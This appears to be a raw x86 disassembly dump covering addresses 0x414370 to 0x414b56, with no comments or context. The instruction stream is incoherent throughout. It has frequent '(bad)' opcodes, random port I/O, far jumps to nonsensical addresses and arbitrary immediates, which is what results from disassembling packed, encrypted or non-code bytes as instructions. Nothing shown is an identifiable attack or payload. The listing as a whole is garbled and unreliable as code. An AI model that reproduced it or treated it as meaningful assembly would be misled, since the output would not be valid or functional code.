  414370:	xchg   ecx,eax
  414371:	bound  edx,QWORD PTR [eax-0x7b]
  414374:	adc    al,0x0
  414376:	pop    edi
  414377:	sbb    cl,BYTE PTR [ecx]
  414379:	sub    al,0xf0
  41437b:	or     DWORD PTR [esi],ecx
  41437d:	mov    ecx,eax
  41437f:	fnstenv [esi-0x42aa2c8d]
  414385:	cwde   
  414386:	ja     0x41432d
  414388:	and    bl,BYTE PTR [ebx]
  41438a:	sub    dh,BYTE PTR [edx+edi*2-0x28bb3d4e]
  414391:	sbb    DWORD PTR [edi-0x24],edi
  414394:	cmp    al,0x4c
  414396:	enter  0x151b,0xa3
  41439a:	(bad)  
  41439b:	adc    al,cl
  41439d:	leave  
  41439e:	sub    BYTE PTR [esp+ebp*8-0x7f],cl
  4143a2:	lods   al,BYTE PTR ds:[esi]
  4143a3:	mov    esi,0xe21bc97f
  4143a8:	in     eax,0x57
  4143aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143ab:	dec    edi
  4143ac:	icebp  
  4143ad:	inc    esi
  4143ae:	xor    al,0x14
  4143b0:	(bad)  
  4143b3:	imul   esi,DWORD PTR [ebx-0x51],0xffffffcf
  4143b7:	jmp    0x4143e9
  4143b9:	push   ss
  4143ba:	sbb    eax,0x1e0961c2
  4143bf:	inc    edi
  4143c0:	cs imul ecx,esp,0xffffffdd
  4143c4:	dec    ecx
  4143c5:	mov    al,BYTE PTR [edx]
  4143c7:	jns    0x414447
  4143c9:	jbe    0x414417
  4143cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143cc:	sbb    BYTE PTR [edx],al
  4143ce:	sub    al,0x57
  4143d0:	(bad)  
  4143d1:	jecxz  0x4143da
  4143d3:	push   eax
  4143d4:	mov    esi,0xdf1f8553
  4143d9:	pop    ds
  4143da:	mov    ah,0x7c
  4143dc:	jp     0x4143dc
  4143de:	in     eax,0xc3
  4143e0:	push   0x2
  4143e2:	or     al,0x97
  4143e4:	out    0xf2,eax
  4143e6:	sbb    dh,BYTE PTR [edi-0x74d1e9cc]
  4143ec:	mov    ebp,0x508f7635
  4143f1:	jnp    0x414379
  4143f3:	add    dl,ch
  4143f5:	je     0x41438c
  4143f7:	pop    ss
  4143f8:	dec    edi
  4143f9:	dec    ecx
  4143fa:	push   ebx
  4143fb:	xchg   esp,eax
  4143fc:	imul   eax,DWORD PTR es:[edi],0x76811e96
  414403:	xchg   ebx,eax
  414404:	or     al,ch
  414406:	mov    al,ds:0x2f8ddc42
  41440b:	xchg   ebp,eax
  41440c:	loop   0x4143d0
  41440e:	dec    edx
  41440f:	dec    eax
  414410:	std    
  414411:	add    dl,BYTE PTR [esi-0x1f]
  414414:	mov    edi,0x32f989ad
  414419:	shl    DWORD PTR [esi],1
  41441b:	js     0x414427
  41441d:	and    al,0xe2
  41441f:	push   es
  414420:	push   0x5d
  414422:	inc    edx
  414423:	retf   
  414424:	dec    esp
  414425:	jle    0x414424
  414427:	xlat   BYTE PTR ds:[ebx]
  414428:	mov    ecx,0x3accebe4
  41442d:	inc    edi
  41442e:	dec    esi
  41442f:	scas   eax,DWORD PTR es:[edi]
  414430:	stos   BYTE PTR es:[edi],al
  414431:	nop
  414432:	pop    esp
  414433:	cld    
  414434:	adc    eax,0x51d921eb
  414439:	scas   eax,DWORD PTR es:[edi]
  41443a:	dec    edx
  41443b:	and    eax,0x9c76625d
  414440:	xor    edx,edx
  414442:	retf   
  414443:	jecxz  0x414441
  414445:	mov    cl,0x5e
  414447:	fiadd  DWORD PTR [edx+0x26]
  41444a:	jne    0x4143e5
  41444c:	adc    ah,BYTE PTR [edx]
  41444e:	mov    BYTE PTR [ecx+esi*4-0x61],0x95
  414453:	in     eax,dx
  414454:	mov    gs,WORD PTR [ebp+0x1507ff99]
  41445a:	popf   
  41445b:	push   cs
  41445c:	test   BYTE PTR [ebx],ch
  41445e:	pop    eax
  41445f:	imul   DWORD PTR [esi]
  414461:	js     0x41448d
  414463:	push   ecx
  414464:	push   ds
  414465:	push   es
  414466:	and    BYTE PTR [esi+edi*8+0x59a1b07],dh
  41446d:	(bad)  
  41446e:	(bad)  
  41446f:	fild   DWORD PTR [esi+0x74]
  414472:	test   DWORD PTR [edi],esi
  414474:	lock fistp QWORD PTR [ebp-0x19d4d81]
  41447b:	data16 shl BYTE PTR [ebp-0x65b60e86],cl
  414482:	dec    ecx
  414483:	mov    cl,0xd5
  414485:	ficomp WORD PTR ds:0x73fb8977
  41448b:	dec    ebp
  41448c:	mov    dh,0xf4
  41448e:	mov    dl,0xef
  414490:	ret    
  414491:	addr16 xchg esi,eax
  414493:	jbe    0x41448a
  414495:	xchg   ecx,eax
  414496:	jnp    0x4144f9
  414498:	push   0x8ea71e30
  41449d:	jge    0x414504
  41449f:	push   eax
  4144a0:	dec    esp
  4144a1:	adc    cl,al
  4144a3:	pop    ds
  4144a4:	xor    eax,0xed096a6
  4144a9:	lods   eax,DWORD PTR ds:[esi]
  4144aa:	aaa    
  4144ab:	iret   
  4144ac:	(bad)
  4144af:	in     eax,0xa9
  4144b1:	xchg   edx,eax
  4144b2:	mov    cl,0xa9
  4144b4:	push   ds
  4144b5:	popf   
  4144b6:	in     al,dx
  4144b7:	xchg   edi,eax
  4144b8:	pop    edx
  4144b9:	jae    0x4144ed
  4144bb:	mov    al,ds:0xfcc6e442
  4144c0:	cmp    DWORD PTR [eax+0x73a07c3a],esp
  4144c6:	and    esp,esp
  4144c8:	loopne 0x414485
  4144ca:	stc    
  4144cb:	arpl   WORD PTR [edx],bx
  4144cd:	jg     0x414473
  4144cf:	pop    esi
  4144d0:	mov    ds:0x56c68f9a,eax
  4144d5:	outs   dx,DWORD PTR ds:[esi]
  4144d6:	or     dh,BYTE PTR [ebx+0xc]
  4144d9:	xchg   edi,eax
  4144da:	ret    0x58ac
  4144dd:	push   ebx
  4144de:	jbe    0x4144ca
  4144e0:	test   al,0x65
  4144e2:	retf   0xe3eb
  4144e5:	bound  esi,QWORD PTR [ebp+0x68]
  4144e8:	cmp    ecx,DWORD PTR [edi+0x40]
  4144eb:	sbb    DWORD PTR [ebp+edx*8-0x28],edx
  4144ef:	fbstp  TBYTE PTR [ebx]
  4144f1:	jo     0x4144ff
  4144f3:	pop    ebp
  4144f4:	push   esi
  4144f5:	(bad)  
  4144f6:	xchg   edx,eax
  4144f7:	jne    0x4144b9
  4144f9:	idiv   edx
  4144fb:	jl     0x414555
  4144fd:	mov    ebp,0x7a895d53
  414502:	mov    bh,0x42
  414504:	dec    ebp
  414505:	inc    edx
  414506:	sbb    al,0x8e
  414508:	mov    gs,WORD PTR [edx-0x45]
  41450b:	sbb    al,0xba
  41450d:	outs   dx,DWORD PTR ds:[esi]
  41450e:	add    edi,DWORD PTR [edx]
  414510:	or     DWORD PTR [ebx-0x67],edi
  414513:	pushw  ds
  414515:	cmp    dl,BYTE PTR ds:0x57b3f4b
  41451b:	adc    eax,0xc4e04ee5
  414520:	sub    BYTE PTR [ebp+0x2f],bl
  414523:	lds    esi,FWORD PTR [ecx-0x52]
  414526:	mov    WORD PTR [edx],es
  414528:	mov    al,ds:0x22185625
  41452d:	and    al,0xe3
  41452f:	aas    
  414530:	sahf   
  414531:	fidiv  WORD PTR [esi]
  414533:	cdq    
  414534:	sub    cl,0x3e
  414537:	scas   al,BYTE PTR es:[edi]
  414538:	xchg   ebp,eax
  414539:	js     0x4144ff
  41453b:	or     ch,BYTE PTR [edi+edi*2]
  41453e:	push   esi
  41453f:	leave  
  414540:	xchg   edx,eax
  414541:	adc    DWORD PTR [edi+0x27a68ec1],ebp
  414547:	cwde   
  414548:	mov    ch,0x8f
  41454a:	sahf   
  41454b:	fs or  al,0xbe
  41454e:	and    eax,0x73f7b08a
  414553:	addr16 popa 
  414555:	in     eax,dx
  414556:	adc    BYTE PTR [esi],ch
  414558:	mov    edx,0xbd6e7a41
  41455d:	xor    al,0x3a
  41455f:	mov    ?,WORD PTR [edi+0x2e]
  414562:	mov    edx,0x209996f
  414567:	loop   0x4145e5
  414569:	push   ebp
  41456a:	stos   DWORD PTR es:[edi],eax
  41456b:	and    BYTE PTR [ebx+0x6d],bh
  41456e:	mov    ebx,0x40724ba7
  414573:	lods   al,BYTE PTR ds:[esi]
  414574:	adc    DWORD PTR [eax-0x44428b75],edx
  41457a:	dec    edi
  41457b:	inc    esp
  41457c:	lea    esi,[eax+0x17]
  41457f:	and    eax,0x2f8aea21
  414584:	outs   dx,BYTE PTR ds:[esi]
  414585:	dec    ecx
  414586:	dec    ecx
  414587:	add    DWORD PTR [esi-0x7a],edx
  41458a:	shl    edx,1
  41458c:	les    ecx,FWORD PTR [eax]
  41458e:	dec    esi
  41458f:	lea    ecx,[edx-0x7d8a77be]
  414595:	pop    es
  414596:	in     al,dx
  414597:	add    dh,BYTE PTR ds:0x6819a3f9
  41459d:	aam    0xd0
  41459f:	(bad)  
  4145a1:	fidiv  DWORD PTR [ebx-0x79]
  4145a4:	shl    DWORD PTR ds:0xa2fdffec,1
  4145aa:	sbb    BYTE PTR [esi],ah
  4145ac:	out    dx,al
  4145ad:	ret    0xc18
  4145b0:	inc    edi
  4145b1:	lea    ebp,[ebp-0x3cf8074f]
  4145b7:	out    0xfd,al
  4145b9:	out    dx,al
  4145ba:	and    BYTE PTR [eax+0x6030f55],ah
  4145c0:	mov    edi,0xa96bb211
  4145c5:	and    eax,0x4e54c326
  4145ca:	(bad)  
  4145cb:	cdq    
  4145cc:	or     dh,BYTE PTR [bx-0x57]
  4145d0:	mov    dh,0x25
  4145d2:	and    eax,0xc45f5f73
  4145d7:	dec    esp
  4145d8:	mov    dh,0x87
  4145da:	mov    al,ds:0x838e11dc
  4145df:	addr16 mov edi,0x396af778
  4145e5:	or     ebp,DWORD PTR [edi+ebx*4]
  4145e8:	jg     0x4145a1
  4145ea:	push   edx
  4145eb:	push   0xffffffd6
  4145ed:	inc    esi
  4145ee:	push   ebx
  4145ef:	aam    0x9
  4145f1:	mov    ds:0x95ac396b,al
  4145f6:	sbb    al,0x2
  4145f8:	xchg   edx,eax
  4145f9:	out    dx,al
  4145fa:	mov    eax,ds:0x863ee183
  4145ff:	jns    0x414646
  414601:	sahf   
  414602:	push   0x1c
  414604:	add    al,0xc8
  414606:	inc    edx
  414607:	repz test ecx,ebx
  41460a:	popa   
  41460b:	jmp    0x414639
  41460d:	ss add bl,dl
  414610:	xor    ebx,ebx
  414612:	mov    cl,0xcb
  414614:	sbb    eax,DWORD PTR gs:[edx]
  414617:	xchg   DWORD PTR [eax+0x40],esp
  41461a:	ret    
  41461b:	or     al,0xf
  41461d:	mov    ebx,0x2a6d8227
  414622:	out    0xb8,eax
  414624:	dec    eax
  414625:	add    al,0xbe
  414627:	shl    DWORD PTR [edi],1
  414629:	mov    bh,0x56
  41462b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41462c:	ins    BYTE PTR es:[edi],dx
  41462d:	mov    ch,0xf2
  41462f:	dec    esp
  414630:	add    ecx,esi
  414632:	outs   dx,BYTE PTR ds:[esi]
  414633:	jno    0x414613
  414635:	xor    DWORD PTR [ebx],eax
  414637:	stc    
  414638:	popa   
  414639:	xor    BYTE PTR [eax+0x58],bh
  41463c:	cs inc ecx
  41463e:	pop    ebp
  41463f:	idiv   bh
  414641:	(bad)  
  414642:	mov    ecx,0x64be0af4
  414647:	adc    DWORD PTR [ecx],ecx
  414649:	sbb    DWORD PTR [si-0x1],ebx
  41464d:	iret   
  41464e:	sub    eax,0xa92ce0fc
  414653:	jmp    0x4145fc
  414655:	pop    esp
  414656:	shl    ebp,cl
  414658:	push   edi
  414659:	mov    ebp,0xb0995e8e
  41465e:	popa   
  41465f:	test   DWORD PTR [ebx+0x5cb8a85],eax
  414665:	hlt    
  414666:	test   BYTE PTR [eax],bh
  414668:	scas   al,BYTE PTR es:[edi]
  414669:	out    0x72,eax
  41466b:	xchg   edx,eax
  41466c:	push   ecx
  41466d:	fiadd  WORD PTR [ecx+0x15]
  414670:	pop    es
  414671:	mov    edx,0x6a1fb905
  414676:	inc    esi
  414677:	iret   
  414678:	scas   eax,DWORD PTR es:[edi]
  414679:	ret    0x3296
  41467c:	adc    al,0x77
  41467e:	sub    bh,ch
  414680:	aam    0x53
  414682:	pop    eax
  414683:	jmp    0x8493db0b
  414688:	mov    edi,0x76662fa3
  41468d:	mov    ?,WORD PTR [edi+eiz*2-0x3c]
  414691:	shl    eax,1
  414693:	bound  esp,QWORD PTR [edi+0x3a795ba4]
  414699:	mov    bl,0x62
  41469b:	repz and BYTE PTR [ecx-0x78],ah
  41469f:	fistp  WORD PTR [edx-0x6517861c]
  4146a5:	dec    ebp
  4146a6:	pop    ds
  4146a7:	jmp    0x414658
  4146a9:	in     eax,dx
  4146aa:	dec    edi
  4146ab:	imul   esi,DWORD PTR [eax],0x1e620c24
  4146b1:	jbe    0x4146d9
  4146b3:	(bad)  
  4146b4:	sti    
  4146b5:	je     0x414659
  4146b7:	aad    0x17
  4146b9:	push   ecx
  4146ba:	test   eax,0xc79ccd0
  4146bf:	das    
  4146c0:	sbb    ebx,DWORD PTR [ecx+0x5282b41c]
  4146c6:	dec    ecx
  4146c7:	mov    DWORD PTR [ecx],esi
  4146c9:	fld    QWORD PTR [edx+0xb]
  4146cc:	mov    bl,0xdc
  4146ce:	mov    al,ds:0x9606e8d0
  4146d3:	mov    dh,0xba
  4146d5:	je     0x4146e7
  4146d7:	in     eax,0x96
  4146d9:	cmp    eax,0x9ec2aa81
  4146de:	addr16 and al,0x65
  4146e1:	and    eax,0x94f1054c
  4146e6:	pop    ebx
  4146e7:	adc    al,0x93
  4146e9:	inc    eax
  4146ea:	jae    0x414700
  4146ec:	mov    ch,0x17
  4146ee:	or     cl,cl
  4146f0:	retf   0x5c4
  4146f3:	gs mov ch,0xf6
  4146f6:	jecxz  0x4146ae
  4146f8:	cmp    edi,DWORD PTR ds:0x2e8cbb3a
  4146fe:	shl    DWORD PTR [ecx],cl
  414700:	popa   
  414701:	and    al,0x66
  414703:	jecxz  0x41471f
  414705:	xchg   ebp,eax
  414706:	daa    
  414707:	mov    al,ds:0x91c7839d
  41470c:	mov    ebp,0xf545a95
  414711:	xchg   esp,eax
  414712:	add    DWORD PTR [eax],edi
  414714:	jno    0x414784
  414716:	test   BYTE PTR [eax-0x45],ah
  414719:	and    edi,DWORD PTR [edi-0x5c4b7559]
  41471f:	dec    esp
  414720:	int    0xf1
  414722:	js     0x414737
  414724:	ss inc esp
  414726:	mov    esi,0x87da06b8
  41472b:	in     al,0x92
  41472d:	cdq    
  41472e:	jmp    0x3f35:0x34139ccb
  414735:	arpl   WORD PTR [eax-0x24],dx
  414738:	lahf   
  414739:	sub    dh,cl
  41473b:	pop    ecx
  41473c:	xor    edx,DWORD PTR [eax]
  41473e:	lods   eax,DWORD PTR ds:[esi]
  41473f:	mov    al,ds:0x9d255879
  414744:	jmp    0x741:0xc29d9ff0
  41474b:	mov    ecx,0xea7673ab
  414750:	jno    0x414778
  414752:	fcomp  DWORD PTR [ebx-0x13606e92]
  414758:	adc    BYTE PTR [eax+ebp*4],dl
  41475b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41475c:	lods   eax,DWORD PTR ds:[esi]
  41475d:	pop    edi
  41475e:	jecxz  0x414720
  414760:	inc    edi
  414761:	or     eax,0x5899492e
  414766:	fdivr  DWORD PTR [esi+0x3e857bfe]
  41476c:	mov    ah,0x8
  41476e:	dec    ebp
  41476f:	jle    0x41475a
  414771:	shl    BYTE PTR [edx+0x6015d90b],1
  414777:	aam    0x85
  414779:	leave  
  41477a:	jbe    0x41479e
  41477c:	xlat   BYTE PTR ds:[ebx]
  41477d:	ror    DWORD PTR [eax+0x74818453],1
  414783:	inc    esp
  414784:	inc    edi
  414785:	xchg   esp,eax
  414786:	shl    DWORD PTR [ebp+0x36db1488],cl
  41478c:	and    eax,0x749a459
  414791:	(bad)  
  414792:	sbb    al,0x40
  414794:	pop    ecx
  414795:	sub    DWORD PTR [eax-0xa],esi
  414798:	aad    0xe
  41479a:	aam    0x4
  41479c:	dec    edx
  41479d:	addr16 icebp 
  41479f:	addr16 ja 0x41479d
  4147a2:	xchg   edi,eax
  4147a3:	(bad)  
  4147a4:	mov    bh,0x80
  4147a6:	in     eax,dx
  4147a7:	(bad)  
  4147a8:	fild   DWORD PTR [eax-0x45d2c5b6]
  4147ae:	and    ebx,DWORD PTR [esi]
  4147b0:	jp     0x414796
  4147b2:	mov    esi,0xc9fbd35
  4147b7:	or     dh,0xd1
  4147ba:	add    eax,ecx
  4147bc:	hlt    
  4147bd:	jno    0x414746
  4147bf:	nop
  4147c0:	mov    eax,ds:0x66839dca
  4147c5:	mov    bh,0x61
  4147c7:	adc    eax,0xe78a4dee
  4147cc:	shl    BYTE PTR [ebp-0x58],1
  4147cf:	jmp    0xbee7bb54
  4147d4:	sbb    eax,0x4fc1008
  4147d9:	or     al,0xb8
  4147db:	pushf  
  4147dc:	das    
  4147dd:	popf   
  4147de:	lods   al,BYTE PTR ds:[esi]
  4147df:	mov    ds:0x59ea35f7,al
  4147e4:	sbb    al,0x6c
  4147e6:	scas   al,BYTE PTR es:[edi]
  4147e7:	retf   0x1aa3
  4147ea:	or     eax,0xbb8760a
  4147ef:	lea    ebp,[eax+ecx*1]
  4147f2:	fimul  WORD PTR [ecx-0x15031778]
  4147f8:	std    
  4147f9:	inc    ah
  4147fb:	enter  0x91ed,0x20
  4147ff:	imul   eax,DWORD PTR [edx],0x51
  414802:	sub    eax,0xf00729e8
  414807:	xor    DWORD PTR [ebx+0x6c],edi
  41480a:	jp     0x414803
  41480c:	xor    DWORD PTR [eax],ecx
  41480e:	loop   0x414863
  414810:	std    
  414811:	jns    0x4147f5
  414813:	ja     0x4147fe
  414815:	imul   DWORD PTR [edx+0x79]
  414818:	out    dx,eax
  414819:	pop    esi
  41481a:	inc    ecx
  41481b:	test   ebx,eax
  41481d:	mov    cl,0x16
  41481f:	aas    
  414820:	add    al,0xc0
  414822:	dec    eax
  414823:	lods   al,BYTE PTR ds:[esi]
  414824:	push   ss
  414825:	and    BYTE PTR ss:[eax],bl
  414828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414829:	inc    ebx
  41482a:	mov    edx,0xf5b7170e
  41482f:	sub    eax,0xba0f69ea
  414834:	xor    ecx,edx
  414836:	mov    ebp,0xc423be1b
  41483b:	(bad)  
  41483c:	aad    0x81
  41483e:	imul   esi,DWORD PTR [eax+ebx*8],0xffffffdc
  414842:	fmul   QWORD PTR [edi]
  414844:	xor    bl,BYTE PTR [edi+0x38d7f752]
  41484a:	lods   eax,DWORD PTR ds:[esi]
  41484b:	xchg   BYTE PTR [edx-0x1f6c35e5],cl
  414851:	mov    eax,ds:0xb90b49e5
  414856:	jge    0x414890
  414858:	jg     0x41484a
  41485a:	aam    0x79
  41485c:	adc    eax,0xa0af15ab
  414861:	in     eax,0xf5
  414863:	sbb    eax,0xd2741d31
  414868:	sub    BYTE PTR [ecx],0x32
  41486b:	pop    ds
  41486c:	and    DWORD PTR [esi+edi*1+0xac9c3bb],0xc8319272
  414877:	sub    BYTE PTR [esi+0x4],bl
  41487a:	retf   
  41487b:	and    al,0x6a
  41487d:	xlat   BYTE PTR ds:[ebx]
  41487e:	pop    ebx
  41487f:	mov    eax,ds:0x6efd3565
  414884:	loope  0x41484f
  414886:	scas   al,BYTE PTR es:[edi]
  414887:	mul    BYTE PTR [ebp-0x18]
  41488a:	je     0x41484f
  41488c:	pop    es
  41488d:	push   esp
  41488e:	mov    al,ds:0xe469c948
  414893:	dec    eax
  414894:	mov    ebp,0x77ac0f97
  414899:	addr16 jae 0x414878
  41489c:	retf   
  41489d:	fadd   DWORD PTR [edx]
  41489f:	mov    ecx,ecx
  4148a1:	mov    eax,0x8c575d45
  4148a6:	or     bl,al
  4148a8:	add    DWORD PTR [ebp+0x1fb8942d],esp
  4148ae:	int3   
  4148af:	xchg   edx,eax
  4148b0:	xor    eax,0x341a1a42
  4148b5:	jnp    0x4148aa
  4148b7:	push   esp
  4148b8:	lahf   
  4148b9:	jbe    0x414907
  4148bb:	jg     0x4148ec
  4148bd:	push   edx
  4148be:	sahf   
  4148bf:	int3   
  4148c0:	cld    
  4148c1:	test   al,0xd9
  4148c3:	and    al,0xd8
  4148c5:	call   0xcf09:0x468fbab5
  4148cc:	mov    BYTE PTR [edx+0x54a02f09],ah
  4148d2:	cdq    
  4148d3:	jecxz  0x414900
  4148d5:	mov    cl,0x3
  4148d7:	jecxz  0x414941
  4148d9:	(bad)  
  4148da:	out    0xe1,eax
  4148dc:	dec    ebx
  4148dd:	jnp    0x414954
  4148df:	or     eax,0xe03376c5
  4148e4:	repnz into 
  4148e6:	push   ebp
  4148e7:	inc    ebx
  4148e8:	fwait
  4148e9:	rcr    BYTE PTR [esi-0xe1e45f0],0xaf
  4148f0:	jae    0x41491f
  4148f2:	les    edi,FWORD PTR [esi+eiz*2+0x9]
  4148f6:	jae    0x414969
  4148f8:	mov    eax,ds:0x9970c7ab
  4148fd:	or     DWORD PTR [edi-0x4ce3f544],edx
  414903:	inc    edx
  414904:	sbb    edx,DWORD PTR [esi-0x7242c87e]
  41490a:	sahf   
  41490b:	test   BYTE PTR [edi-0x58120f7f],ch
  414911:	pop    es
  414912:	retf   
  414913:	leave  
  414914:	repnz sub DWORD PTR [ebp+ebx*8-0x631ce745],esi
  41491c:	fcmovne st,st(4)
  41491e:	or     esp,DWORD PTR [edi-0x60]
  414921:	xchg   edx,eax
  414922:	fistp  DWORD PTR ds:0x918cf7dc
  414928:	outs   dx,DWORD PTR ds:[esi]
  414929:	or     al,0xc9
  41492b:	sbb    al,0xc4
  41492d:	fdiv   QWORD PTR [eax+0x1c]
  414930:	pop    edi
  414931:	ret    
  414932:	std    
  414933:	imul   ebx,DWORD PTR [ebp-0x1d],0xc147ac5d
  41493a:	cmp    eax,0xcb7c4a86
  41493f:	or     ecx,edi
  414941:	sbb    ch,al
  414943:	cwde   
  414944:	jmp    0xd4147801
  414949:	jle    0x414940
  41494b:	call   0x6e24:0xc40bd906
  414952:	out    0x3f,eax
  414954:	les    esp,FWORD PTR [esi-0x500a6a0a]
  41495a:	pop    ds
  41495b:	or     esi,DWORD PTR [edi]
  41495d:	sub    BYTE PTR ds:0x92826a0,0xe0
  414964:	repnz test BYTE PTR [esi+0x608ea0d8],ah
  41496b:	das    
  41496c:	jl     0x414947
  41496e:	or     ch,BYTE PTR [eax+0x4f]
  414971:	jg     0x41496c
  414973:	outs   dx,BYTE PTR ds:[esi]
  414974:	jnp    0x4149ef
  414976:	mov    edx,0xa298654f
  41497b:	cmp    BYTE PTR [esi+0x75],0x1d
  41497f:	push   ds
  414980:	mov    ch,0x6b
  414982:	mov    WORD PTR [edx+0x5af2d4f1],fs
  414988:	push   esp
  414989:	sub    al,0xd1
  41498b:	(bad)  
  41498c:	test   eax,0x1712cf8c
  414991:	mov    al,BYTE PTR [eax-0x7f]
  414994:	enter  0x2dc3,0x11
  414998:	cld    
  414999:	jns    0x414944
  41499b:	out    0x64,eax
  41499d:	sbb    al,0x9b
  41499f:	jecxz  0x41493f
  4149a1:	(bad)  [ecx-0x14]
  4149a4:	jae    0x41495e
  4149a6:	aaa    
  4149a7:	or     DWORD PTR [ecx+0x797b0073],ebp
  4149ad:	shl    DWORD PTR [ebx-0x1830b7c9],cl
  4149b3:	adc    eax,0x983dd8ab
  4149b8:	sti    
  4149b9:	push   0x8e68a087
  4149be:	inc    eax
  4149bf:	inc    esp
  4149c0:	jecxz  0x4149b2
  4149c2:	jge    0x4149df
  4149c4:	sbb    bh,BYTE PTR ds:0xe33d6b69
  4149ca:	xchg   DWORD PTR [esi-0x6],esp
  4149cd:	adc    ch,BYTE PTR [ecx-0x7507a310]
  4149d3:	(bad)  
  4149d4:	dec    ebp
  4149d5:	loop   0x414a43
  4149d7:	outs   dx,BYTE PTR ds:[esi]
  4149d8:	test   eax,0x841cfc35
  4149dd:	bound  esp,QWORD PTR ds:0xb71da5d0
  4149e3:	push   esp
  4149e4:	jae    0x4149ed
  4149e6:	es out 0x4c,eax
  4149e9:	call   0xf7fe8fbb
  4149ee:	mov    dh,0xb6
  4149f0:	mov    edx,0x9a7d6d0
  4149f5:	popa   
  4149f6:	pop    ebx
  4149f7:	pop    edx
  4149f8:	dec    edx
  4149f9:	mov    ecx,0x4c35a60f
  4149fe:	fisubr WORD PTR [eax+0x5e]
  414a01:	mov    al,ds:0x78f5b2a
  414a06:	mov    edi,0xb1a7ade7
  414a0b:	add    eax,0x12457663
  414a10:	cdq    
  414a11:	jbe    0x4149ca
  414a13:	test   BYTE PTR [ebp+0x2938e818],ch
  414a19:	push   cs
  414a1a:	iret   
  414a1b:	pop    ds
  414a1c:	in     eax,0x17
  414a1e:	or     BYTE PTR [esi-0x464f1d31],0xd2
  414a25:	push   0xa213c0e
  414a2a:	sbb    eax,0xf8261a04
  414a2f:	xchg   DWORD PTR ds:[edi],edi
  414a32:	loopne 0x414a61
  414a34:	xor    bh,BYTE PTR [ebx]
  414a36:	push   ebp
  414a37:	sub    eax,0x85bb994b
  414a3c:	add    edi,ebx
  414a3e:	pop    ebx
  414a3f:	inc    eax
  414a40:	inc    eax
  414a41:	push   edi
  414a42:	and    al,0x1e
  414a44:	sbb    dl,bh
  414a46:	mov    ebp,0x50092e8d
  414a4b:	(bad)  
  414a4c:	jne    0x414a7f
  414a4e:	aam    0x7e
  414a50:	mov    cl,0x85
  414a52:	aam    0x47
  414a54:	jbe    0x414ad2
  414a56:	rcl    ah,1
  414a58:	mov    al,0x80
  414a5a:	jp     0x4149dc
  414a5c:	and    eax,0x93d82ac4
  414a61:	popa   
  414a62:	push   ds
  414a63:	inc    eax
  414a64:	(bad)
  414a67:	loopne 0x414a93
  414a69:	push   ebx
  414a6a:	outs   dx,DWORD PTR ds:[esi]
  414a6b:	(bad)  
  414a6d:	mov    cl,0x20
  414a6f:	or     edx,0xdba9ba1b
  414a75:	das    
  414a76:	cwde   
  414a77:	fwait
  414a78:	mov    ds:0xe990f65b,al
  414a7d:	daa    
  414a7e:	pop    ecx
  414a7f:	cmc    
  414a80:	mov    ah,0x1d
  414a82:	xor    esp,DWORD PTR [ebp-0x7e]
  414a85:	xor    ebp,DWORD PTR ds:0xc31b930
  414a8b:	lock mov edi,0x3b4dfa09
  414a91:	pop    eax
  414a92:	jecxz  0x414a82
  414a94:	cmp    edx,edi
  414a96:	(bad)  [ebx+ecx*4+0x2c]
  414a9a:	dec    eax
  414a9b:	pop    DWORD PTR ds:0xb5b21e73
  414aa1:	stos   DWORD PTR es:[edi],eax
  414aa2:	sub    al,dl
  414aa4:	pop    esi
  414aa5:	xor    DWORD PTR cs:[ebx+0x1f],esi
  414aa9:	xchg   DWORD PTR [eax],ebp
  414aab:	retf   0x3092
  414aae:	push   esi
  414aaf:	in     al,dx
  414ab0:	loop   0x414a3d
  414ab2:	out    0x98,al
  414ab4:	inc    eax
  414ab5:	fstp   st(7)
  414ab7:	call   0xdcb9:0xdda9602a
  414abe:	push   es
  414abf:	push   cs
  414ac0:	mov    ebx,DWORD PTR [ebx]
  414ac2:	(bad)  
  414ac3:	mov    ebx,0x90a5559
  414ac8:	sti    
  414ac9:	push   0xffffffe2
  414acb:	cmp    eax,ebx
  414acd:	and    BYTE PTR [edx-0x2e],ah
  414ad0:	pop    edi
  414ad1:	outs   dx,BYTE PTR ds:[esi]
  414ad2:	call   0x2c50f1c
  414ad7:	fwait
  414ad8:	out    dx,al
  414ad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ada:	jle    0x414b4e
  414adc:	outs   dx,DWORD PTR ds:[esi]
  414add:	adc    eax,0xd4ff2b0b
  414ae2:	dec    edi
  414ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ae4:	outs   dx,BYTE PTR ds:[esi]
  414ae5:	(bad)  
  414ae6:	mov    ch,0x24
  414ae8:	dec    esp
  414ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aea:	mov    ds:0x511a99c6,al
  414aef:	fst    QWORD PTR [ecx]
  414af1:	jl     0x414b58
  414af3:	push   ebp
  414af4:	aas    
  414af5:	ja     0x414a79
  414af7:	out    0x73,al
  414af9:	imul   ebx,DWORD PTR [edx-0x80],0xffffff86
  414afd:	call   0x44b6:0x58fef09
  414b04:	call   eax
  414b06:	out    dx,eax
  414b07:	adc    ecx,DWORD PTR [ebp+ebx*1-0xd9b7607]
  414b0e:	imul   ebp,ebx,0x6
  414b11:	(bad)  
  414b13:	repnz out dx,al
  414b15:	int3   
  414b16:	jge    0x414aa5
  414b18:	(bad)  
  414b19:	sbb    eax,DWORD PTR [ebx-0x3ea96991]
  414b1f:	lahf   
  414b20:	mov    edi,0xb2082986
  414b25:	sbb    esp,DWORD PTR [ebx-0x18a5a928]
  414b2b:	adc    al,0x6a
  414b2d:	pusha  
  414b2e:	iret   
  414b2f:	dec    ecx
  414b30:	outs   dx,BYTE PTR ds:[esi]
  414b31:	test   DWORD PTR [ebp+eax*4+0x466aebd5],ebp
  414b38:	mov    dh,0x29
  414b3a:	pop    esp
  414b3b:	sbb    al,0x78
  414b3d:	ret    
  414b3e:	pop    ebx
  414b3f:	jl     0x414b70
  414b41:	dec    esi
  414b42:	pop    ebp
  414b43:	pop    ebp
  414b44:	jle    0x414bb5
  414b46:	and    al,0x6
  414b48:	sbb    al,0xbe
  414b4a:	ret    
  414b4b:	retf   0x2e81
  414b4e:	add    esp,DWORD PTR [edx+ebx*8+0x2c]
  414b52:	xchg   edx,eax
  414b53:	cmp    al,BYTE PTR [ebp-0x61]
  414b56:	(bad)
